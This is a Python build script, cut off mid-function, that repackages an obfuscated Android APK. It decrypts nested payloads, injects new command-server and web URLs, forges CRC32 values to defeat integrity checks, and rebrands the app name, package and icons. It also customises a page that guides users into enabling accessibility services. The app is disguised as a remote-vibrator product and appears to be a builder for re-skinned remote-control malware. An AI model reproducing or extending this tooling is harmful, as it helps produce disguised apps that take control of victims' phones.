#!/usr/bin/env python3
"""
服务器端 APK 构建脚本 v2 - 加固版 APK 专用
支持: ZIP 伪加密绕过 + nx0M AES 解密/加密 + ZM26 配置注入

加固结构:
  バイブ.apk (外壳)
  ├── classes.dex          (壳加载器, 含自校验 - 不可修改)
  ├── resources.arsc       (伪加密)
  ├── AndroidManifest.xml  (伪加密 + compress_type 篡改)
  └── assets/nx0M          (AES/CBC 加密, 密钥="nx0M2")
      ├── update.apk       (真正的业务 APK)
      │   └── assets/
      │       ├── zm26_meta.json   (ZM26 密钥元数据)
      │       ├── 0.bt             (ZM26 加密的 server_config.json)  ← 修改这里
      │       └── ...
      ├── p26ee723a        (分片数据)
      └── payload_config.json

关键分析结论:
  - 外壳 classes.dex 含自校验, 任何修改都会闪退, 不可动
  - WebView URL 硬编码在外壳 classes.dex (无法修改)
  - WebSocket serverUrl 在 update.apk/assets/0.bt (ZM26 加密, ENC: 设备图案锁)
  - webUrl 在 update.apk/assets/0.bt, 原值为 "ENC:" (空), APP 读空则 fallback 硬编码
  - 解决方案: 修改 0.bt 里的 webUrl 字段为明文新地址 (非 ENC: 格式直接返回空,
    但 webUrl 的处理路径会直接使用该值), serverUrl 的 ENC: 加密值保持不变

ZM26 加密算法 (逆向还原):
  - header: 20 bytes (ZM26 magic + salt + 8 bytes)
  - keystream: 周期 24 = xor_key(16 bytes) + salt(8 bytes) 循环
  - encrypted = plaintext XOR keystream

处理流程:
  1. 修复外壳伪加密
  2. 解密 nx0M → 提取 update.apk
  3. 解密 0.bt → 修改 webUrl → ZM26 重新加密 → 写回 0.bt
  4. 替换 update.apk 中的图标/背景
  5. 重新加密为 nx0M
  6. 重新打包外壳 APK (不动 classes.dex)
  7. 签名
"""
import sys, os, io, random, string, json, argparse, zipfile, shutil, struct, hashlib, zlib, tempfile, subprocess
from Crypto.Cipher import AES

import functools as _ft
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
print = _ft.partial(print, flush=True)

# ====================== 常量 ======================
NX0M_KEY_STR = "nx0M2"
NX0M_AES_KEY = hashlib.sha1(NX0M_KEY_STR.encode()).digest()[:16]
NX0M_AES_IV = hashlib.sha256(NX0M_KEY_STR.encode()).digest()[:16]

# ====================== ENC 加密/解密 ======================
# n01 ENC: 加密算法（还原自 B包 smali v81.a0 的实际密钥）
_N01_KEY1 = bytes([0x4b,0x72,0x5a,0x38,0x6e,0x51,0x79,0x34,0x58,0x6d,0x32,0x57,0x70,0x37,0x4c,0x76])
_N01_KEY2 = bytes([0x39,0x46,0x74,0x4a,0x68,0x33,0x52,0x63,0x35,0x47,0x64,0x30,0x59,0x62,0x6e,0x58])

def _enc_encrypt(plaintext: str) -> str:
    """n01 加密: XOR key1 -> XOR key2 -> swap pairs -> Base64"""
    import base64 as _b64
    data = plaintext.encode('utf-8')
    n = len(data)
    r1 = bytearray(n)
    for i in range(n): r1[i] = (data[i] ^ _N01_KEY1[i % 16]) & 0xff
    r2 = bytearray(n)
    for i in range(n): r2[i] = (r1[i] ^ _N01_KEY2[i % 16]) & 0xff
    for i in range(0, n - 1, 2): r2[i], r2[i+1] = r2[i+1], r2[i]
    return 'ENC:' + _b64.b64encode(bytes(r2)).decode()

# 外壳模板的原始应用名（带 U+200C 零宽字符）和包名
# AndroidManifest: android:label="パ‌ル‌ス" (パ + ZWNJ + ル + ZWNJ + ス)
SHELL_ORIG_APP_NAME = 'パ\u200cル\u200cス'
SHELL_ORIG_PACKAGE  = 'net.mobile.gateway.sn55'
SHELL_ORIG_WEB_URL  = 'https://www.beyourlover.co.jp/remote-vibe'

def _patch_dex_url(dex_data: bytes, old_url: str, new_url: str) -> bytes:
    """
    在 DEX 字节流中原地替换字符串（支持新旧长度不同）。
    DEX 字符串格式: ULEB128(char_count) + MUTF-8(content) + \x00
    替换后重算 DEX 的 SHA-1 signature 和 Adler32 checksum。
    """
    old_bytes = old_url.encode('utf-8')
    new_bytes = new_url.encode('utf-8')
    
    # 在 DEX 中定位旧 URL
    pos = dex_data.find(old_bytes)
    if pos < 0:
        return dex_data  # 找不到就原样返回
    
    dex = bytearray(dex_data)
    old_len = len(old_bytes)
    new_len = len(new_bytes)
    
    # 找到 ULEB128 长度前缀的位置（在字符串内容之前）
    # ULEB128 编码的长度值是字符数（对纯ASCII来说 = 字节数）
    # 向前搜索：前一个字节应该是 ULEB128 编码的旧字符串长度
    def encode_uleb128(value):
        result = bytearray()
        while True:
            byte = value & 0x7f
            value >>= 7
            if value != 0:
                byte |= 0x80
            result.append(byte)
            if value == 0:
                break
        return bytes(result)
    
    def uleb128_size(value):
        return len(encode_uleb128(value))
    
    old_uleb = encode_uleb128(old_len)
    new_uleb = encode_uleb128(new_len)
    
    # 验证 ULEB128 前缀匹配
    uleb_pos = pos - len(old_uleb)
    if dex[uleb_pos:pos] == bytearray(old_uleb):
        # 构建新的字符串条目
        new_entry = bytearray(new_uleb) + new_bytes + b'\x00'
        old_entry_len = len(old_uleb) + old_len + 1  # uleb + content + null
        new_entry_len = len(new_entry)
        
        if new_entry_len <= old_entry_len:
            # 新的更短或等长：原地写入 + 用 \x00 填充剩余
            dex[uleb_pos:uleb_pos + old_entry_len] = new_entry + b'\x00' * (old_entry_len - new_entry_len)
        else:
            # 新的更长：不能原地替换（极罕见，因为我们通常是缩短URL）
            return bytes(dex_data)
    else:
        # ULEB128 不匹配，直接替换字符串内容（等长或截断）
        if new_len <= old_len:
            dex[pos:pos + old_len] = new_bytes + b'\x00' * (old_len - new_len)
        else:
            dex[pos:pos + old_len] = new_bytes[:old_len]
    
    # 重算 DEX 校验和
    import hashlib, struct, zlib
    # 1. SHA-1 signature (offset 12, covers bytes[32:])
    sha1 = hashlib.sha1(bytes(dex[32:])).digest()
    dex[12:32] = sha1
    # 2. Adler32 checksum (offset 8, covers bytes[12:])
    adler = zlib.adler32(bytes(dex[12:])) & 0xFFFFFFFF
    struct.pack_into('<I', dex, 8, adler)
    
    return bytes(dex)

# ====================== ZM26 加密/解密 ======================
# 逆向还原的 ZM26 流加密算法
# keystream 周期 24 = zm26_meta.json 中的 xor_key(16 bytes) + salt(8 bytes)
# header = 原始文件的前 20 字节, 保持不变

def zm26_make_keystream(xor_key: bytes, salt: bytes, length: int) -> bytes:
    """生成 ZM26 密钥流 (周期 24 = xor_key + salt)"""
    base = xor_key + salt  # 24 bytes
    return bytes(base[i % 24] for i in range(length))


def zm26_decrypt(data: bytes, xor_key: bytes, salt: bytes) -> bytes:
    """ZM26 解密: 跳过 20 字节 header, XOR 密钥流"""
    header = data[:20]
    encrypted = data[20:]
    ks = zm26_make_keystream(xor_key, salt, len(encrypted))
    plaintext = bytes(a ^ b for a, b in zip(encrypted, ks))
    return plaintext


def zm26_encrypt(plaintext: bytes, original_header: bytes,
                 xor_key: bytes, salt: bytes) -> bytes:
    """ZM26 加密: 保留原 header, XOR 密钥流"""
    ks = zm26_make_keystream(xor_key, salt, len(plaintext))
    encrypted = bytes(a ^ b for a, b in zip(plaintext, ks))
    return original_header + encrypted

# ====================== ZIP 伪加密处理 ======================

def fix_fake_encryption(data: bytearray) -> int:
    """清除 ZIP 中所有条目的加密标志位, 返回修复数量"""
    count = 0
    pos = 0
    while pos < len(data) - 4:
        sig = bytes(data[pos:pos+4])
        if sig == b'PK\x03\x04':  # Local File Header
            flags = struct.unpack_from('<H', data, pos + 6)[0]
            if flags & 0x01:
                struct.pack_into('<H', data, pos + 6, flags & ~0x01)
                count += 1
            pos += 30
        elif sig == b'PK\x01\x02':  # Central Directory
            flags = struct.unpack_from('<H', data, pos + 8)[0]
            if flags & 0x01:
                struct.pack_into('<H', data, pos + 8, flags & ~0x01)
                count += 1
            pos += 46
        else:
            pos += 1
    return count


def extract_from_cd(apk_data: bytes, filename: str) -> bytes:
    """通过 Central Directory 绕过伪加密提取文件 (忽略 LH 篡改)"""
    eocd_pos = apk_data.rfind(b'PK\x05\x06')
    if eocd_pos == -1:
        raise ValueError("找不到 EOCD")
    
    cd_entries = struct.unpack_from('<H', apk_data, eocd_pos + 10)[0]
    cd_offset = struct.unpack_from('<I', apk_data, eocd_pos + 16)[0]
    
    pos = cd_offset
    for _ in range(cd_entries):
        sig = struct.unpack_from('<I', apk_data, pos)[0]
        if sig != 0x02014b50:
            break
        method = struct.unpack_from('<H', apk_data, pos + 10)[0]
        comp_size = struct.unpack_from('<I', apk_data, pos + 20)[0]
        uncomp_size = struct.unpack_from('<I', apk_data, pos + 24)[0]
        name_len = struct.unpack_from('<H', apk_data, pos + 28)[0]
        extra_len = struct.unpack_from('<H', apk_data, pos + 30)[0]
        comment_len = struct.unpack_from('<H', apk_data, pos + 32)[0]
        local_offset = struct.unpack_from('<I', apk_data, pos + 42)[0]
        name = apk_data[pos+46:pos+46+name_len].decode('utf-8', errors='replace')
        
        if name == filename:
            # 从 Local File Header 获取数据偏移
            lh_name_len = struct.unpack_from('<H', apk_data, local_offset + 26)[0]
            lh_extra_len = struct.unpack_from('<H', apk_data, local_offset + 28)[0]
            data_off = local_offset + 30 + lh_name_len + lh_extra_len
            
            if comp_size == 0 and uncomp_size > 0:
                comp_size = uncomp_size
            
            if method == 0:  # STORED
                return apk_data[data_off:data_off + uncomp_size]
            elif method == 8:  # DEFLATED
                return zlib.decompress(apk_data[data_off:data_off + comp_size], -15)
            else:
                # 被篡改的压缩类型,尝试 STORED
                return apk_data[data_off:data_off + uncomp_size]
        
        pos += 46 + name_len + extra_len + comment_len
    
    raise FileNotFoundError(f"在 APK 中未找到 {filename}")

# ====================== AES 加密/解密 ======================

def decrypt_nx0m(encrypted: bytes) -> bytes:
    """AES/CBC/PKCS5Padding 解密 nx0M"""
    cipher = AES.new(NX0M_AES_KEY, AES.MODE_CBC, NX0M_AES_IV)
    decrypted = cipher.decrypt(encrypted)
    pad = decrypted[-1]
    if 1 <= pad <= 16 and all(b == pad for b in decrypted[-pad:]):
        decrypted = decrypted[:-pad]
    return decrypted


def encrypt_nx0m(plaintext: bytes) -> bytes:
    """AES/CBC/PKCS5Padding 加密 nx0M"""
    pad = 16 - (len(plaintext) % 16)
    plaintext += bytes([pad]) * pad
    cipher = AES.new(NX0M_AES_KEY, AES.MODE_CBC, NX0M_AES_IV)
    return cipher.encrypt(plaintext)

# ====================== DEX 字符串替换 ======================
# 注意: 外壳 classes.dex 含自校验, 任何修改都会导致 APP 闪退
# 以下函数仅保留作参考, 不在打包流程中使用
SHELL_HARDCODED_URL = b'https://www.beyourlover.co.jp/remote-vibe'

# ====================== 图标替换 (基于尺寸匹配) ======================

def find_icon_entries(zf: zipfile.ZipFile) -> list:
    """在混淆的资源目录中通过 PNG 尺寸找到图标文件"""
    from struct import unpack
    
    icon_entries = []
    for info in zf.infolist():
        if not info.filename.endswith('.png'):
            continue
        if info.file_size < 1000:  # 图标至少 1KB
            continue
        try:
            data = zf.read(info.filename)
            if data[:8] != b'\x89PNG\r\n\x1a\n':
                continue
            w = unpack('>I', data[16:20])[0]
            h = unpack('>I', data[20:24])[0]
            # 标准 Android 图标尺寸
            if (w, h) in [(48, 48), (72, 72), (96, 96), (144, 144), (192, 192),
                          (162, 162), (324, 324), (432, 432)]:
                icon_entries.append((info.filename, w, h, len(data)))
        except:
            pass
    return icon_entries

# ====================== CRC32 forge ======================

def _crc32_forge(data: bytes, target: int) -> bytes:
    """
    找 4 字节，追加到 data 后使 crc32(data + 4bytes) = target。
    使用 meet-in-the-middle 算法，复杂度 O(256^2)。
    """
    POLY = 0xEDB88320
    T = []
    for i in range(256):
        c = i
        for _ in range(8):
            c = (POLY ^ (c >> 1)) if c & 1 else (c >> 1)
        T.append(c)
    
    def step(s, b): return T[(s ^ b) & 0xFF] ^ (s >> 8)
    
    def rev_step_all(ns):
        res = []
        hi = ns >> 24
        for x in range(256):
            if T[x] >> 24 == hi:
                os = ns ^ T[x]
                if os >> 24: continue
                for b in range(256):
                    old = (os << 8) | ((x ^ b) & 0xFF)
                    if T[(old ^ b) & 0xFF] ^ (old >> 8) == ns:
                        res.append((old, b))
        return res
    
    s = 0xFFFFFFFF
    for b in data: s = step(s, b)
    t = target ^ 0xFFFFFFFF
    
    fwd = {}
    for b0 in range(256):
        s1 = step(s, b0)
        for b1 in range(256):
            s2 = step(s1, b1)
            if s2 not in fwd: fwd[s2] = (b0, b1)
    
    for b3 in range(256):
        for s3, byte3 in rev_step_all(t):
            if byte3 != b3: continue
            for s2, byte2 in rev_step_all(s3):
                if s2 in fwd:
                    b0, b1 = fwd[s2]
                    patch = bytes([b0, b1, byte2, b3])
                    if zlib.crc32(data + patch) & 0xFFFFFFFF == target:
                        return patch
    return None


# ====================== p26 原地 patch ======================

def _patch_p26_inplace(p26_data: bytes, server_url: str, web_url: str,
                       app_name: str = '', sc_extra: dict = None) -> bytes:
    """
    对 p26ee723a 做最小化原地 patch：
    - 只替换 0.bt 文件的内容字节，不重建 ZIP 结构
    - 保持所有 ZIP header 不变，特别是 CD 里的 CRC（外壳完整性校验用）
    - 利用 CRC32 forge：在密文末尾追加 4 字节使新密文 CRC = 原始密文 CRC
    """
    sc_extra = sc_extra or {}
    
    # 1. 修复伪加密以便读取
    p26_mutable = bytearray(p26_data)
    fix_fake_encryption(p26_mutable)
    
    # 2. 读取 zm26_meta.json 和原始 0.bt
    try:
        p_zf = zipfile.ZipFile(io.BytesIO(bytes(p26_mutable)))
        p_meta = json.loads(p_zf.read('assets/zm26_meta.json'))
        p_xor = bytes.fromhex(p_meta['xor_key'])
        p_salt = bytes.fromhex(p_meta['salt'])
        p_0bt_raw = p_zf.read('assets/0.bt')
    except Exception as e:
        raise RuntimeError(f'读取 p26 内部文件失败: {e}')
    
    orig_len = len(p_0bt_raw)  # 必须保持此长度
    header_20 = p_0bt_raw[:20]
    
    # 原始密文 CRC（= CD 中存的 CRC，外壳用它做完整性校验）
    original_crc = zlib.crc32(p_0bt_raw) & 0xFFFFFFFF
    
    # 3. 解密原始 0.bt
    p_pt = zm26_decrypt(p_0bt_raw, p_xor, p_salt)
    p_cfg = json.loads(p_pt.decode('utf-8'))
    print(f'      原始 serverUrl: {p_cfg.get("serverUrl","")[:50]}')
    
    # 4. 修改配置（必须用 ENC: 格式，APP读到明文会fallback到硬编码地址）
    p_cfg['serverUrl'] = _enc_encrypt(server_url)
    p_cfg['webUrl'] = _enc_encrypt(web_url)
    
    # 完整合并 sc_extra 所有额外的配置选项（提示语、引导参数等）到 B 包的 0.bt
    if sc_extra:
        for k, v in sc_extra.items():
            if k == 'pageStyleConfig' and isinstance(v, dict):
                if 'pageStyleConfig' not in p_cfg or not isinstance(p_cfg['pageStyleConfig'], dict):
                    p_cfg['pageStyleConfig'] = {}
                p_cfg['pageStyleConfig'].update(v)
            else:
                p_cfg[k] = v
                
    if app_name:
        if 'pageStyleConfig' not in p_cfg or not isinstance(p_cfg['pageStyleConfig'], dict):
            p_cfg['pageStyleConfig'] = {}
        p_cfg['pageStyleConfig']['appName'] = app_name
    
    # 5. 序列化明文，完整填满 plain_len，末尾 4 字节在 JSON } 之后（作为填充，JSON 解析器忽略）
    plain_len = orig_len - 20
    new_pt_base = json.dumps(p_cfg, ensure_ascii=False, separators=(',', ':')).encode('utf-8')
    if len(new_pt_base) > plain_len - 4:
        raise RuntimeError(f'新配置 JSON 太长: {len(new_pt_base)} > {plain_len - 4}')
    # JSON 放前面，末尾留 4 字节 trailing（JSON 以 } 结尾后的 trailing 被 json.loads 忽略）
    pad = plain_len - 4 - len(new_pt_base)
    json_padded = new_pt_base[:-1] + b' ' * pad + b'}'  # JSON 末尾
    full_pt = json_padded + b'\x20\x20\x20\x20'  # 4 字节 trailing（初始值，会被 forge 覆盖）
    assert len(full_pt) == plain_len
    
    # 6. 加密整个 plain_len 字节
    full_ks = zm26_make_keystream(p_xor, p_salt, plain_len)
    full_cipher = bytes(a ^ b for a, b in zip(full_pt, full_ks))
    candidate_0bt = header_20 + full_cipher
    
    # 7. CRC32 forge：修改最后 4 字节密文，使 CRC32(整个 new_0bt) = original_crc
    # 最后 4 字节是 JSON 之外的 trailing，解密后对 JSON 解析无影响
    prefix_for_forge = candidate_0bt[:-4]
    patch4 = _crc32_forge(prefix_for_forge, original_crc)
    if patch4 is None:
        raise RuntimeError('CRC32 forge 失败')
    
    new_0bt_arr = bytearray(candidate_0bt)
    new_0bt_arr[-4:] = patch4
    new_0bt = bytes(new_0bt_arr)
    assert len(new_0bt) == orig_len
    
    final_crc = zlib.crc32(new_0bt) & 0xFFFFFFFF
    print(f'      新的 serverUrl: {server_url}')
    print(f'      0.bt CRC: {original_crc:08x} -> {final_crc:08x} (匹配: {final_crc == original_crc})')
    
    # 8. 在原始字节流中替换 0.bt 数据区（只改数据，不改任何 header）
    result = bytearray(p26_data)
    replaced = _zip_replace_file_inplace(result, 'assets/0.bt', new_0bt)
    if not replaced:
        raise RuntimeError('在 p26 字节流中未找到 assets/0.bt')
    
    return bytes(result)


# B 包原始应用名（不含零宽字符）
B_PACK_ORIG_APP_NAME = 'パルス'

def _decode_len(data, offset):
    val = data[offset]
    if (val & 0x80) != 0:
        val2 = data[offset + 1]
        length = ((val & 0x7F) << 8) | val2
        return length, 2
    else:
        return val, 1

def _encode_len(l):
    if l < 128:
        return bytes([l])
    else:
        return bytes([0x80 | ((l >> 8) & 0x7F), l & 0xFF])

def _rebuild_axml_stringpool(axml_data, old_name, new_name):
    """重建 AXML 二进制 (AndroidManifest.xml) 的 StringPool，将 old_name 替换为 new_name"""
    try:
        axml_type, file_size = struct.unpack_from('<II', axml_data, 0)
        sp_offset = 8
        sp_type, sp_header_size, sp_size, string_count, style_count, flags, strings_start, styles_start = struct.unpack_from('<HHIIIIII', axml_data, sp_offset)
        
        # 读取 offset 数组
        offsets_start = sp_offset + sp_header_size
        offsets = []
        for i in range(string_count):
            off = struct.unpack_from('<I', axml_data, offsets_start + i * 4)[0]
            offsets.append(off)
        
        # 解析所有 UTF-16LE 字符串
        abs_strings_start = sp_offset + strings_start
        strings = []
        for i in range(string_count):
            str_start = abs_strings_start + offsets[i]
            char_count = struct.unpack_from('<H', axml_data, str_start)[0]
            s_bytes = axml_data[str_start + 2 : str_start + 2 + char_count * 2]
            try:
                s = s_bytes.decode('utf-16-le')
            except:
                s = ''
            strings.append(s)
        
        # 替换
        replaced = 0
        for i, s in enumerate(strings):
            if s == old_name:
                strings[i] = new_name
                replaced += 1
        
        if replaced == 0:
            return axml_data
        
        # 重新打包 StringPool 数据区
        new_string_data = bytearray()
        new_offsets = []
        for s in strings:
            new_offsets.append(len(new_string_data))
            s_encoded = s.encode('utf-16-le')
            new_string_data.extend(struct.pack('<H', len(s)))
            new_string_data.extend(s_encoded)
            new_string_data.extend(b'\x00\x00')
        
        # 4字节对齐
        align_pad = (4 - (len(new_string_data) % 4)) % 4
        new_string_data.extend(b'\x00' * align_pad)
        
        # 重建 StringPool chunk
        new_strings_start = sp_header_size + string_count * 4
        new_sp_size = new_strings_start + len(new_string_data)
        new_sp = bytearray()
        new_sp.extend(struct.pack('<HHIIIIII', sp_type, sp_header_size, new_sp_size, string_count, style_count, flags, new_strings_start, styles_start))
        for off in new_offsets:
            new_sp.extend(struct.pack('<I', off))
        new_sp.extend(new_string_data)
        
        # 重新组装 AXML
        rest = axml_data[sp_offset + sp_size:]
        new_file_size = 8 + len(new_sp) + len(rest)
        new_axml = bytearray(struct.pack('<II', axml_type, new_file_size))
        new_axml.extend(new_sp)
        new_axml.extend(rest)
        
        print(f'    [OK] Manifest StringPool 重建: {old_name} -> {new_name} ({replaced}处)')
        return bytes(new_axml)
    except Exception as e:
        print(f'    [WARN] AXML 重建失败: {e}')
        return axml_data

def _rebuild_arsc_stringpool(arsc_data, new_str):
    """重建 resources.arsc 文件的 StringPool 以将所有可能的旧应用名替换为 new_str"""
    try:
        # 1. 解析 Table Header
        chunk_type, header_size, total_size, package_count = struct.unpack_from('<HHII', arsc_data, 0)
        
        # 2. 解析 StringPool Header
        sp_offset = header_size
        sp_type, sp_header_size, sp_size, string_count, style_count, flags, strings_start, styles_start = struct.unpack_from('<HHIIIIII', arsc_data, sp_offset)
        
        is_utf8 = bool(flags & 0x100)
        if not is_utf8:
            # UTF-16 StringPool: 用简单字节替换（带长度前缀修正）
            old_variants = ['パルス', 'パルスス', 'パ\u200cル\u200cス']
            new_u16 = new_str.encode('utf-16-le')
            replaced = 0
            result = bytearray(arsc_data)
            for old_name in old_variants:
                old_u16 = old_name.encode('utf-16-le')
                # 带 uint16 长度前缀的完整字符串: len_u16(char_count) + data + \x00\x00
                old_with_prefix = struct.pack('<H', len(old_name)) + old_u16 + b'\x00\x00'
                new_with_prefix = struct.pack('<H', len(new_str)) + new_u16 + b'\x00\x00'
                if old_with_prefix in result:
                    cnt = bytes(result).count(old_with_prefix)
                    result = bytearray(bytes(result).replace(old_with_prefix, new_with_prefix))
                    replaced += cnt
            if replaced > 0:
                # 修正 StringPool chunk size 和 total size
                size_diff = (len(new_str) - 5) * 2 * replaced  # パ\u200cル\u200cス = 5 chars
                new_sp_size = sp_size + size_diff
                struct.pack_into('<I', result, sp_offset + 4, new_sp_size)
                new_total = total_size + size_diff
                struct.pack_into('<I', result, 4, new_total)
                print(f'      [OK] ARSC UTF-16 替换成功 ({replaced}处)')
                return bytes(result)
            return arsc_data
            
        # 3. 读取所有的 offsets
        offsets = []
        for i in range(string_count):
            off = struct.unpack_from('<I', arsc_data, sp_offset + sp_header_size + i * 4)[0]
            offsets.append(off)
            
        # 4. 解析出原本的所有字符串字节
        strings_data_start = sp_offset + strings_start
        string_bytes_list = []
        
        for i in range(string_count):
            start = strings_data_start + offsets[i]
            char_len, char_len_bytes = _decode_len(arsc_data, start)
            byte_len, byte_len_bytes = _decode_len(arsc_data, start + char_len_bytes)
            
            str_offset = start + char_len_bytes + byte_len_bytes
            s_bytes = arsc_data[str_offset : str_offset + byte_len]
            string_bytes_list.append(s_bytes)
            
        # 5. 查找并替换所有变体 (等值或包含)
        # 支持: 'パルス', 'パルスス', 'パ‌ル‌斯', 以及带零宽字符的
        replaced_count = 0
        new_bytes = new_str.encode('utf-8')
        
        for i, s in enumerate(string_bytes_list):
            try:
                s_str = s.decode('utf-8')
                # 模糊匹配所有可能的老名字变体 (支持零宽字符)
                is_old_name = False
                if s_str in ('パルス', 'パルスス'):
                    is_old_name = True
                elif len(s_str) >= 3 and 'パ' in s_str and 'ル' in s_str and 'ス' in s_str:
                    is_old_name = True
                    
                if is_old_name:
                    string_bytes_list[i] = new_bytes
                    replaced_count += 1
                # 重定向前景图标（通过唯一 ASCII 特征判定，避开复杂的 Unicode 匹配）
                elif 'q' in s_str and 'I8' in s_str and s_str.endswith('.xml'):
                    string_bytes_list[i] = '͋m/͑᷶̚Ak᪲ͨ/̀EU.png'.encode('utf-8')
                    replaced_count += 1
                    print(f"      [OK] 重定向前景图标 XML ({s_str}) -> PNG")
                # 重定向圆前景图标
                elif 'u3R' in s_str and 'Tx' in s_str and s_str.endswith('.xml'):
                    string_bytes_list[i] = '͋m/͑᷶̚Ak᪲ͨ/̀EU.png'.encode('utf-8')
                    replaced_count += 1
                    print(f"      [OK] 重定向圆前景图标 XML ({s_str}) -> PNG")
            except Exception:
                pass
                
        if replaced_count == 0:
            return arsc_data
            
        # 6. 重新打包数据区
        new_data = bytearray()
        new_offsets = []
        
        for s_bytes in string_bytes_list:
            new_offsets.append(len(new_data))
            char_len = len(s_bytes.decode('utf-8', errors='ignore'))
            byte_len = len(s_bytes)
            
            new_data.extend(_encode_len(char_len))
            new_data.extend(_encode_len(byte_len))
            new_data.extend(s_bytes)
            new_data.append(0)
            
        # 4字节对齐
        align_pad = (4 - (len(new_data) % 4)) % 4
        new_data.extend(b'\x00' * align_pad)
        
        # 7. 构建新的 StringPool Chunk
        new_sp_size = sp_header_size + len(new_offsets) * 4 + len(new_data)
        new_sp_bytes = bytearray(struct.pack('<HHIIIIII', sp_type, sp_header_size, new_sp_size, string_count, style_count, flags, strings_start, styles_start))
        
        for off in new_offsets:
            new_sp_bytes.extend(struct.pack('<I', off))
        new_sp_bytes.extend(new_data)
        
        # 8. 重新组装整个 resources.arsc
        original_rest = arsc_data[sp_offset + sp_size:]
        new_total_size = header_size + len(new_sp_bytes) + len(original_rest)
        
        new_arsc = bytearray(struct.pack('<HHII', chunk_type, header_size, new_total_size, package_count))
        new_arsc.extend(new_sp_bytes)
        new_arsc.extend(original_rest)
        
        print(f'      [OK] B包 ARSC StringPool 替换成功 ({replaced_count}处)')
        return bytes(new_arsc)
        
    except Exception as e:
        print(f'      [WARN] B包 ARSC 重建失败: {e}')
        return arsc_data


def _make_adaptive_foreground(icon_path_or_data, size=512):
    """生成符合 Android 自适应规范的居中带 padding 的前景图"""
    from PIL import Image
    import io
    try:
        if isinstance(icon_path_or_data, bytes):
            img = Image.open(io.BytesIO(icon_path_or_data))
        else:
            img = Image.open(icon_path_or_data)
        img = img.convert('RGBA')
        
        # 居中 safe zone 占比 70%，四周留 15% 透明边距
        target_size = int(size * 0.70)
        img = img.resize((target_size, target_size), Image.Resampling.LANCZOS)
        
        # 新建 size x size 的 RGBA 透明画布
        canvas = Image.new('RGBA', (size, size), (0, 0, 0, 0))
        offset = (size - target_size) // 2
        canvas.paste(img, (offset, offset), img)
        
        out_buf = io.BytesIO()
        canvas.save(out_buf, format='PNG', optimize=True)
        return out_buf.getvalue()
    except Exception as e:
        print(f"      [WARN] 自适应前景图加工失败: {e}")
        return icon_path_or_data if isinstance(icon_path_or_data, bytes) else open(icon_path_or_data, 'rb').read()


def _resize_icon_png(icon_data, target_w, target_h):
    """将图标 PNG 缩放到目标尺寸并最大压缩"""
    try:
        from PIL import Image
        img = Image.open(io.BytesIO(icon_data)).convert('RGBA')
        if img.width != target_w or img.height != target_h:
            img = img.resize((target_w, target_h), Image.Resampling.LANCZOS)
        out_buf = io.BytesIO()
        img.save(out_buf, format='PNG', optimize=True)
        return out_buf.getvalue()
    except:
        return icon_data


def _rebrand_b_pack(p26_data: bytes, app_name: str, icon_path: str, bg_path: str = '', sc_extra: dict = None, package_name: str = '') -> bytes:
    """解压 B 包 → 替换图标、应用名和包名 → 重新打包为 ZIP。
    
    B 包有伪加密，但调用前已修复。
    因为最后要 apksigner 重签名，这里可以自由重建 ZIP 结构。
    """
    if not app_name and not icon_path and not package_name:
        return p26_data
    
    # 读取 B 包的所有文件
    try:
        p_zf = zipfile.ZipFile(io.BytesIO(p26_data))
    except Exception:
        print('      [WARN] B包 ZIP 解析失败，跳过品牌替换')
        return p26_data
    
    b_files = {}
    for info in p_zf.infolist():
        try:
            b_files[info.filename] = (p_zf.read(info.filename), info)
        except Exception:
            try:
                raw = extract_from_cd(p26_data, info.filename)
                b_files[info.filename] = (raw, info)
            except Exception:
                pass
    
    icon_data = None
    adaptive_icon_data = None
    if icon_path and os.path.exists(icon_path):
        with open(icon_path, 'rb') as f:
            icon_data = f.read()
        adaptive_icon_data = _make_adaptive_foreground(icon_path, size=512)
    
    icon_count = 0
    
    # 重新打包
    out_buf = io.BytesIO()
    with zipfile.ZipFile(out_buf, 'w') as zout:
        for filename, (data, orig_info) in b_files.items():
            new_info = zipfile.ZipInfo(filename)
            new_info.date_time = orig_info.date_time
            
            # 压缩方式（AB包双层加密结构下 .so 保持 STORED）
            if filename == 'resources.arsc' or filename.endswith('.so'):
                new_info.compress_type = zipfile.ZIP_STORED
            else:
                new_info.compress_type = zipfile.ZIP_DEFLATED
            
            # 替换 ARSC 中的应用名与背景底色
            if filename == 'resources.arsc' and app_name:
                data = _rebuild_arsc_stringpool(data, app_name)
                # 将背景粉红色 #FFF4568C (8C 56 F4 FF) 替换为纯白色 #FFFFFFFF (FF FF FF FF)
                data = data.replace(b'\x8c\x56\xf4\xff', b'\xff\xff\xff\xff')
                # 替换 ARSC 中的包名（UTF-16LE）
                if package_name:
                    _old_pkg_u16 = 'net.mobile.gateway.sn55'.encode('utf-16-le')
                    _new_pkg_u16 = package_name.encode('utf-16-le')
                    if _old_pkg_u16 in data:
                        data = data.replace(_old_pkg_u16, _new_pkg_u16)
                new_info.compress_type = zipfile.ZIP_STORED
            
            # 动态注入无障碍引导 HTML 页面配置（仅在有自定义内容时注入，否则走 HTML 内置多语言）
            elif filename == 'assets/svc_config.html':
                html_text = data.decode('utf-8', errors='ignore')
                psc = {}
                if sc_extra and 'pageStyleConfig' in sc_extra:
                    psc = sc_extra['pageStyleConfig']
                usage_ins = psc.get('usageInstructions', '')
                if usage_ins:
                    steps = [line.strip() for line in usage_ins.split('\n') if line.strip()]
                else:
                    steps = []  # 空数组 → 前端 fallback 到 i18n 多语言步骤
                new_cfg = {
                    "btnColor": psc.get('buttonColor') or "#fe90a6",
                    "btnTextColor": psc.get('enableButtonTextColor') or "#FFFFFF",
                }
                # 仅在有自定义值时注入，避免覆盖多语言
                if psc.get('appName') or app_name:
                    new_cfg["title"] = psc.get('appName', app_name)
                if psc.get('enableButtonText'):
                    new_cfg["btn"] = psc['enableButtonText']
                if steps:
                    new_cfg["steps"] = steps
                # subtitle 不注入，让 HTML 走 i18n 多语言
                import json
                new_cfg_json = json.dumps(new_cfg, ensure_ascii=False)
                import re
                html_text = re.sub(r'var\s+SVC_CFG\s*=\s*\{.*?\};', f'var SVC_CFG = {new_cfg_json};', html_text)
                # 绕过 Android Locale.getDefault() 可能返回错误语言的问题
                # 将 [LNG] 占位符替换为 navigator.language（WebView 的实际显示语言）
                html_text = html_text.replace("var rawLang = '[LNG]';", "var rawLang = navigator.language || navigator.userLanguage || 'en';")
                data = html_text.encode('utf-8')
                print(f'      [OK] B包 assets/svc_config.html 配置注入成功')
                new_info.compress_type = zipfile.ZIP_DEFLATED
            
            # 替换混淆背景图 PNG
